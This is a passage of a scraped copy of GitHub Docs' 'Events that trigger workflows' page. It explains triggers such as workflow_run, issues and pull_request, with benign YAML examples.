steps: - run: echo 'The triggering workflow failed' \nLimiting your workflow to run based on branches\nYou can use the branches or branches-ignore filter to specify what branches the triggering workflow must run on in order to trigger your workflow. For more information, see Workflow syntax for GitHub Actions. For example, a workflow with the following trigger will only run when the workflow named Build runs on a branch named canary.\non: workflow_run: workflows: [Build] types: [requested] branches: [canary] \nUsing data from the triggering workflow\nYou can access the workflow_run event payload that corresponds to the workflow that triggered your workflow. For example, if your triggering workflow generates artifacts, a workflow triggered with the workflow_run event can access these artifacts.\nThe following workflow uploads data as an artifact. (In this simplified example, the data is the pull request number.)\nname: Upload data on: pull_request: jobs: upload: runs-on: ubuntu-latest steps: - name: Save PR number env: PR_NUMBER: ${{ github.event.number }} run: | mkdir -p ./pr echo $PR_NUMBER > ./pr/pr_number - uses: actions/upload-artifact@v4 with: name: pr_number path: pr/ \nWhen a run of the above workflow completes, it triggers a run of the following workflow. The following workflow uses the github.event.workflow_run context and the GitHub REST API to download the artifact that was uploaded by the above workflow, unzips the downloaded artifact, and comments on the pull request whose number was uploaded as an artifact.\nname: Use the data on: workflow_run: workflows: [Upload data] types: - completed jobs: download: runs-on: ubuntu-latest steps: - name: 'Download artifact' uses: actions/github-script@v7 with: script: | let allArtifacts = await github.rest.actions.listWorkflowRunArtifacts({ owner: context.repo.owner, repo: context.repo.repo, run_id: context.payload.workflow_run.id, }); let matchArtifact = allArtifacts.data.artifacts.filter((artifact) => { return artifact.name == \"pr_number\" })[0]; let download = await github.rest.actions.downloadArtifact({ owner: context.repo.owner, repo: context.repo.repo, artifact_id: matchArtifact.id, archive_format: 'zip', }); const fs = require('fs'); const path = require('path'); const temp = '${{ runner.temp }}/artifacts'; if (!fs.existsSync(temp)){ fs.mkdirSync(temp); } fs.writeFileSync(path.join(temp, 'pr_number.zip'), Buffer.from(download.data)); - name: 'Unzip artifact' run: unzip pr_number.zip -d \"${{ runner.temp }}/artifacts\" - name: 'Comment on PR' uses: actions/github-script@v7 with: github-token: ${{ secrets.GITHUB_TOKEN }} script: | const fs = require('fs'); const path = require('path'); const temp = '${{ runner.temp }}/artifacts'; const issue_number = Number(fs.readFileSync(path.join(temp, 'pr_number'))); await github.rest.issues.createComment({ owner: context.repo.owner, repo: context.repo.repo, issue_number: issue_number, body: 'Thank you for the PR!' });",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-events-that-trigger-workflows-8wdghk.html",
  "markdown": "# Events that trigger workflows - GitHub Docs\n\nYou can configure your workflows to run when specific activity on GitHub happens, at a scheduled time, or when an event outside of GitHub occurs.\n\n## [About events that trigger workflows](#about-events-that-trigger-workflows)\n\nWorkflow triggers are events that cause a workflow to run. For more information about how to use workflow triggers, see [Triggering a workflow](https://docs.github.com/en/actions/using-workflows/triggering-a-workflow).\n\nSome events have multiple activity types. For these events, you can specify which activity types will trigger a workflow run. For more information about what each activity type means, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads).\n\nNote\n\nNot all webhook events trigger workflows.\n\n## [`branch_protection_rule`](#branch_protection_rule)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`branch_protection_rule`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#branch_protection_rule)\n\n\\- `created`  \n\\- `edited`  \n\\- `deleted`\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#branch_protection_rule). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when branch protection rules in the workflow repository are changed. For more information about branch protection rules, see [About protected branches](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches). For information about the branch protection rule APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#branchprotectionrule) in the GraphQL API documentation or [REST API endpoints for branches and their settings](https://docs.github.com/en/rest/branches).\n\nFor example, you can run a workflow when a branch protection rule has been `created` or `deleted`:\n\n```\non:\n  branch_protection_rule:\n    types: [created, deleted]\n```\n\n## [`check_run`](#check_run)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`check_run`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#check_run)\n\n\\- `created`  \n\\- `rerequested`  \n\\- `completed`  \n\\- `requested_action`\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#check_run). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when activity related to a check run occurs. A check run is an individual test that is part of a check suite. For information, see [Using the REST API to interact with checks](https://docs.github.com/en/rest/guides/using-the-rest-api-to-interact-with-checks). For information about the check run APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#checkrun) in the GraphQL API documentation or [REST API endpoints for check runs](https://docs.github.com/en/rest/checks/runs).\n\nFor example, you can run a workflow when a check run has been `rerequested` or `completed`.\n\n```\non:\n  check_run:\n    types: [rerequested, completed]\n```\n\n## [`check_suite`](#check_suite)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`check_suite`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#check_suite)\n\n\\- `completed`\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#check_suite). Although only the `completed` activity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nNote\n\nTo prevent recursive workflows, this event does not trigger workflows if the check suite was created by GitHub Actions.\n\nRuns your workflow when check suite activity occurs. A check suite is a collection of the check runs created for a specific commit. Check suites summarize the status and conclusion of the check runs that are in the suite. For information, see [Using the REST API to interact with checks](https://docs.github.com/en/rest/guides/using-the-rest-api-to-interact-with-checks). For information about the check suite APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#checksuite) in the GraphQL API documentation or [REST API endpoints for check suites](https://docs.github.com/en/rest/checks/suites).\n\nFor example, you can run a workflow when a check suite has been `completed`.\n\n```\non:\n  check_suite:\n    types: [completed]\n```\n\n## [`create`](#create)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`create`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#create)\n\nNot applicable\n\nLast commit on the created branch or tag\n\nBranch or tag created\n\nNote\n\nAn event will not be created when you create more than three tags at once.\n\nRuns your workflow when someone creates a Git reference (Git branch or tag) in the workflow's repository. For information about the APIs to create a Git reference, see [Mutations](https://docs.github.com/en/graphql/reference/mutations#createref) in the GraphQL API documentation or [REST API endpoints for Git references](https://docs.github.com/en/rest/git/refs#create-a-reference).\n\nFor example, you can run a workflow when the `create` event occurs.\n\n```\non:\n  create\n```\n\n## [`delete`](#delete)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`delete`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#delete)\n\nNot applicable\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nNote\n\nAn event will not be created when you delete more than three tags at once.\n\nRuns your workflow when someone deletes a Git reference (Git branch or tag) in the workflow's repository. For information about the APIs to delete a Git reference, see [Mutations](https://docs.github.com/en/graphql/reference/mutations#deleteref) in the GraphQL API documentation or [REST API endpoints for Git references](https://docs.github.com/en/rest/git/refs#delete-a-reference).\n\nFor example, you can run a workflow when the `delete` event occurs.\n\n```\non:\n  delete\n```\n\n## [`deployment`](#deployment)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`deployment`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#deployment)\n\nNot applicable\n\nCommit to be deployed\n\nBranch or tag to be deployed (empty if created with a commit SHA)\n\nRuns your workflow when someone creates a deployment in the workflow's repository. Deployments created with a commit SHA may not have a Git ref. For information about the APIs to create a deployment, see [Mutations](https://docs.github.com/en/graphql/reference/mutations#createdeployment) in the GraphQL API documentation or [REST API endpoints for repositories](https://docs.github.com/en/rest/repos#deployments).\n\nFor example, you can run a workflow when the `deployment` event occurs.\n\n```\non:\n  deployment\n```\n\n## [`deployment_status`](#deployment_status)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`deployment_status`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#deployment_status)\n\nNot applicable\n\nCommit to be deployed\n\nBranch or tag to be deployed (empty if commit)\n\nNote\n\nWhen a deployment status's state is set to `inactive`, a workflow run will not be triggered.\n\nRuns your workflow when a third party provides a deployment status. Deployments created with a commit SHA may not have a Git ref. For information about the APIs to create a deployment status, see [Mutations](https://docs.github.com/en/graphql/reference/mutations#createdeploymentstatus) in the GraphQL API documentation or [REST API endpoints for deployments](https://docs.github.com/en/rest/deployments#create-a-deployment-status).\n\nFor example, you can run a workflow when the `deployment_status` event occurs.\n\n```\non:\n  deployment_status\n```\n\n## [`discussion`](#discussion)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`discussion`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#discussion)\n\n\\- `created`  \n\\- `edited`  \n\\- `deleted`  \n\\- `transferred`  \n\\- `pinned`  \n\\- `unpinned`  \n\\- `labeled`  \n\\- `unlabeled`  \n\\- `locked`  \n\\- `unlocked`  \n\\- `category_changed`  \n\\- `answered`  \n\\- `unanswered`\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#discussion). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nNote\n\nWebhook events for GitHub Discussions are currently in public preview and subject to change.\n\nRuns your workflow when a discussion in the workflow's repository is created or modified. For activity related to comments on a discussion, use the [`discussion_comment`](#discussion_comment) event. For more information about discussions, see [About discussions](https://docs.github.com/en/discussions/collaborating-with-your-community-using-discussions/about-discussions). For information about the GraphQL API, see [Objects](https://docs.github.com/en/graphql/reference/objects#discussion).\n\nFor example, you can run a workflow when a discussion has been `created`, `edited`, or `answered`.\n\n```\non:\n  discussion:\n    types: [created, edited, answered]\n```\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`discussion_comment`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#discussion_comment)\n\n\\- `created`  \n\\- `edited`  \n\\- `deleted`  \n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#discussion_comment). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nNote\n\nWebhook events for GitHub Discussions are currently in public preview and subject to change.\n\nRuns your workflow when a comment on a discussion in the workflow's repository is created or modified. For activity related to a discussion as opposed to comments on the discussion, use the [`discussion`](#discussion) event. For more information about discussions, see [About discussions](https://docs.github.com/en/discussions/collaborating-with-your-community-using-discussions/about-discussions). For information about the GraphQL API, see [Objects](https://docs.github.com/en/graphql/reference/objects#discussion).\n\nFor example, you can run a workflow when a discussion comment has been `created` or `deleted`.\n\n```\non:\n  discussion_comment:\n    types: [created, deleted]\n```\n\n## [`fork`](#fork)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`fork`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#fork)\n\nNot applicable\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when someone forks a repository. For information about the REST API, see [REST API endpoints for forks](https://docs.github.com/en/rest/repos/forks#create-a-fork).\n\nFor example, you can run a workflow when the `fork` event occurs.\n\n```\non:\n  fork\n```\n\n## [`gollum`](#gollum)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`gollum`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#gollum)\n\nNot applicable\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when someone creates or updates a Wiki page. For more information, see [About wikis](https://docs.github.com/en/communities/documenting-your-project-with-wikis/about-wikis).\n\nFor example, you can run a workflow when the `gollum` event occurs.\n\n```\non:\n  gollum\n```\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`issue_comment`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#issue_comment)\n\n\\- `created`  \n\\- `edited`  \n\\- `deleted`  \n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#issue_comment). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when an issue or pull request comment is created, edited, or deleted. For information about the issue comment APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#issuecomment) in the GraphQL API documentation or [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#issue_comment) in the REST API documentation.\n\nFor example, you can run a workflow when an issue or pull request comment has been `created` or `deleted`.\n\n```\non:\n  issue_comment:\n    types: [created, deleted]\n```\n\nThe `issue_comment` event occurs for comments on both issues and pull requests. You can use the `github.event.issue.pull_request` property in a conditional to take different action depending on whether the triggering object was an issue or pull request.\n\nFor example, this workflow will run the `pr_commented` job only if the `issue_comment` event originated from a pull request. It will run the `issue_commented` job only if the `issue_comment` event originated from an issue.\n\n```\non: issue_comment\n\njobs:\n  pr_commented:\n    # This job only runs for pull request comments\n    name: PR comment\n    if: ${{ github.event.issue.pull_request }}\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo A comment on PR $NUMBER\n        env:\n          NUMBER: ${{ github.event.issue.number }}\n\n  issue_commented:\n    # This job only runs for issue comments\n    name: Issue comment\n    if: ${{ !github.event.issue.pull_request }}\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo A comment on issue $NUMBER\n        env:\n          NUMBER: ${{ github.event.issue.number }}\n```\n\n## [`issues`](#issues)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`issues`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#issues)\n\n\\- `opened`  \n\\- `edited`  \n\\- `deleted`  \n\\- `transferred`  \n\\- `pinned`  \n\\- `unpinned`  \n\\- `closed`  \n\\- `reopened`  \n\\- `assigned`  \n\\- `unassigned`  \n\\- `labeled`  \n\\- `unlabeled`  \n\\- `locked`  \n\\- `unlocked`  \n\\- `milestoned`  \n\\- `demilestoned`  \n\\- `typed`  \n\\- `untyped`\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#issues). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when an issue in the workflow's repository is created or modified. For activity related to comments in an issue, use the [`issue_comment`](#issue_comment) event. For more information about issues, see [About issues](https://docs.github.com/en/issues/tracking-your-work-with-issues/about-issues). For information about the issue APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#issue) in the GraphQL API documentation or [REST API endpoints for issues](https://docs.github.com/en/rest/issues).\n\nFor example, you can run a workflow when an issue has been `opened`, `edited`, or `milestoned`.\n\n```\non:\n  issues:\n    types: [opened, edited, milestoned]\n```\n\n## [`label`](#label)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`label`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#label)\n\n\\- `created`  \n\\- `edited`  \n\\- `deleted`  \n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#label). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when a label in your workflow's repository is created or modified. For more information about labels, see [Managing labels](https://docs.github.com/en/issues/using-labels-and-milestones-to-track-work/managing-labels). For information about the label APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#label) in the GraphQL API documentation or [REST API endpoints for labels](https://docs.github.com/en/rest/issues/labels).\n\nIf you want to run your workflow when a label is added to or removed from an issue, pull request, or discussion, use the `labeled` or `unlabeled` activity types for the [`issues`](#issues), [`pull_request`](#pull_request), [`pull_request_target`](#pull_request_target), or [`discussion`](#discussion) events instead.\n\nFor example, you can run a workflow when a label has been `created` or `deleted`.\n\n```\non:\n  label:\n    types: [created, deleted]\n```\n\n## [`merge_group`](#merge_group)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`merge_group`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#merge_group)\n\n`checks_requested`\n\nSHA of the merge group\n\nRef of the merge group\n\nNote\n\n*   More than one activity type triggers this event. Although only the `checks_requested` activity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#merge_group). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n*   If your repository uses GitHub Actions to perform required checks on pull requests in your repository, you need to update the workflows to include the `merge_group` event as an additional trigger. Otherwise, status checks will not be triggered when you add a pull request to a merge queue. The merge will fail as the required status check will not be reported. The `merge_group` event is separate from the `pull_request` and `push` events.\n\nRuns your workflow when a pull request is added to a merge queue, which adds the pull request to a merge group. For more information see [Merging a pull request with a merge queue](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/incorporating-changes-from-a-pull-request/merging-a-pull-request-with-a-merge-queue).\n\nFor example, you can run a workflow when the `checks_requested` activity has occurred.\n\n```\non:\n  pull_request:\n    branches: [ \"main\" ]\n  merge_group:\n    types: [checks_requested]\n```\n\n## [`milestone`](#milestone)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`milestone`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#milestone)\n\n\\- `created`  \n\\- `closed`  \n\\- `opened`  \n\\- `edited`  \n\\- `deleted`  \n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nMore than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#milestone). By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when a milestone in the workflow's repository is created or modified. For more information about milestones, see [About milestones](https://docs.github.com/en/issues/using-labels-and-milestones-to-track-work/about-milestones). For information about the milestone APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#milestone) in the GraphQL API documentation or [REST API endpoints for milestones](https://docs.github.com/en/rest/issues/milestones).\n\nIf you want to run your workflow when an issue is added to or removed from a milestone, use the `milestoned` or `demilestoned` activity types for the [`issues`](#issues) event instead.\n\nFor example, you can run a workflow when a milestone has been `opened` or `deleted`.\n\n```\non:\n  milestone:\n    types: [opened, deleted]\n```\n\n## [`page_build`](#page_build)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`page_build`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#page_build)\n\nNot applicable\n\nLast commit on default branch\n\nNot applicable\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when someone pushes to a branch that is the publishing source for GitHub Pages, if GitHub Pages is enabled for the repository. For more information about GitHub Pages publishing sources, see [Configuring a publishing source for your GitHub Pages site](https://docs.github.com/en/pages/getting-started-with-github-pages/configuring-a-publishing-source-for-your-github-pages-site). For information about the REST API, see [REST API endpoints for repositories](https://docs.github.com/en/rest/repos#pages).\n\nFor example, you can run a workflow when the `page_build` event occurs.\n\n```\non:\n  page_build\n```\n\n## [`public`](#public)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`public`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#public)\n\nNot applicable\n\nLast commit on default branch\n\nDefault branch\n\nNote\n\nThis event will only trigger a workflow run if the workflow file exists on the default branch.\n\nRuns your workflow when your workflow's repository changes from private to public. For information about the REST API, see [REST API endpoints for repositories](https://docs.github.com/en/rest/repos#edit).\n\nFor example, you can run a workflow when the `public` event occurs.\n\n```\non:\n  public\n```\n\n## [`pull_request`](#pull_request)\n\nWebhook event payload\n\nActivity types\n\n`GITHUB_SHA`\n\n`GITHUB_REF`\n\n[`pull_request`](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#pull_request)\n\n\\- `assigned`  \n\\- `unassigned`  \n\\- `labeled`  \n\\- `unlabeled`  \n\\- `opened`  \n\\- `edited`  \n\\- `closed`  \n\\- `reopened`  \n\\- `synchronize`  \n\\- `converted_to_draft`  \n\\- `locked`  \n\\- `unlocked`  \n\\- `enqueued`  \n\\- `dequeued`  \n\\- `milestoned`  \n\\- `demilestoned`  \n\\- `ready_for_review`  \n\\- `review_requested`  \n\\- `review_request_removed`  \n\\- `auto_merge_enabled`  \n\\- `auto_merge_disabled`\n\nLast merge commit on the `GITHUB_REF` branch\n\nPR merge branch `refs/pull/PULL_REQUEST_NUMBER/merge`\n\nNote\n\n*   More than one activity type triggers this event. For information about each activity type, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#pull_request). By default, a workflow only runs when a `pull_request` event's activity type is `opened`, `synchronize`, or `reopened`. To trigger workflows by different activity types, use the `types` keyword. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onevent_nametypes).\n*   Workflows will not run on `pull_request` activity if the pull request has a merge conflict. The merge conflict must be resolved first. Conversely, workflows with the `pull_request_target` event will run even if the pull request has a merge conflict. Before using the `pull_request_target` trigger, you should be aware of the security risks. For more information, see [`pull_request_target`](#pull_request_target).\n*   The `pull_request` webhook event payload is empty for merged pull requests and pull requests that come from forked repositories.\n*   The value of `GITHUB_REF` varies for a closed pull request depending on whether the pull request has been merged or not. If a pull request was closed but not merged, it will be `refs/pull/PULL_REQUEST_NUMBER/merge`. If a pull request was closed as a result of being merged, it will be the fully qualified `ref` of the branch it was merged into, for example `/refs/heads/main`.\n\nRuns your workflow when activity on a pull request in the workflow's repository occurs. For example, if no activity types are specified, the workflow runs when a pull request is opened or reopened or when the head branch of the pull request is updated. For activity related to pull request reviews, pull request review comments, or pull request comments, use the [`pull_request_review`](#pull_request_review), [`pull_request_review_comment`](#pull_request_review_comment), or [`issue_comment`](#issue_comment) events instead. For information about the pull request APIs, see [Objects](https://docs.github.com/en/graphql/reference/objects#pullrequest) in the GraphQL API documentation or [REST API endpoints for pull requests](https://docs.github.com/en/rest/pulls).\n\nNote that `GITHUB_SHA` for this event is the last merge commit of the pull request merge branch. If you want to get the commit ID for the last commit to the head branch of the pull request, use `github.event.pull_request.head.sha` instead.\n\nFor example, you can run a workflow when a pull request has been opened or reopened.\n\n```\non:\n  pull_request:\n    types: [opened, reopened]\n```\n\nYou can use the event context to further control when jobs in your workflow will run. For example, this workflow will run when a review is requested on a pull request, but the `specific_review_requested` job will only run when a review by `octo-team` is requested.\n\n```\non:\n  pull_request:\n    types: [review_requested]\njobs:\n  specific_review_requested:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.requested_team.name == 'octo-team'}}\n    steps:\n      - run: echo 'A review from octo-team was requested'\n```\n\n### [Running your `pull_request` workflow based on the head or base branch of a pull request](#running-your-pull_request-workflow-based-on-the-head-or-base-branch-of-a-pull-request)\n\nYou can use the `branches` or `branches-ignore` filter to configure your workflow to only run on pull requests that target specific branches. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpull_requestpull_request_targetbranchesbranches-ignore).\n\nFor example, this workflow will run when someone opens a pull request that targets a branch whose name starts with `releases/`:\n\n```\non:\n  pull_request:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n```\n\nNote\n\nIf you use both the `branches` filter and the `paths` filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (`.js`) file is opened on a branch whose name starts with `releases/`:\n\n```\non:\n  pull_request:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'\n```\n\nTo run a job based on the pull request's head branch name (as opposed to the pull request's base branch name), use the `github.head_ref` context in a conditional. For example, this workflow will run whenever a pull request is opened, but the `run_if` job will only execute if the head of the pull request is a branch whose name starts with `releases/`:\n\n```\non:\n  pull_request:\n    types:\n      - opened\njobs:\n  run_if:\n    if: startsWith(github.head_ref, 'releases/')\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"The head of this PR starts with 'releases/'\"\n```\n\n### [Running your `pull_request` workflow based on files changed in a pull request](#running-your-pull_request-workflow-based-on-files-changed-in-a-pull-request)\n\nYou can also configure your workflow to run when a pull request changes specific files. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore).\n\nFor example, this workflow will run when a pull request includes a change to a JavaScript file (`.js`):\n\n```\non:\n  pull_request:\n    paths:\n      - '**.js'\n```\n\nNote\n\nIf you use both the `branches` filter and the `paths` filter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (`.js`) file is opened on a branch whose name starts with `releases/`:\n\n```\non:\n  pull_request:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'\n```\n\n### [Running your `pull_request` workflow when a pull request merges](#running-your-pull_request-workflow-when-a-pull-request-merges)\n\nWhen a pull request merges, the pull request is automatically closed. To run a workflow when a pull request merges, use the `pull_request` `closed` event type along with a conditional that checks the `merged` value of the event. For example, the following workflow will run whenever a pull request closes. The `if_merged` job will only run if the pull request was also merged.\n\n```\non:\n  pull_request:\n    types:\n      - closed\n\njobs:\n  if_merged:\n    if: github.event.pull_request.merged == true\n    runs-on: ubuntu-latest\n    steps:\n    - run: |\n        echo The PR was merged\n```\n\n#### [Workflows in forked repositories](#workflows-in-forked-repositories)\n\nWorkflows don't run in forked repositories by default. You must enable GitHub Actions in the **Actions** tab of the forked repository.\n\nWith the exception of `GITHUB_TOKEN`, secrets are not passed to the runner when a workflow is triggered from a forked repository. The `GITHUB_TOKEN` has read-only 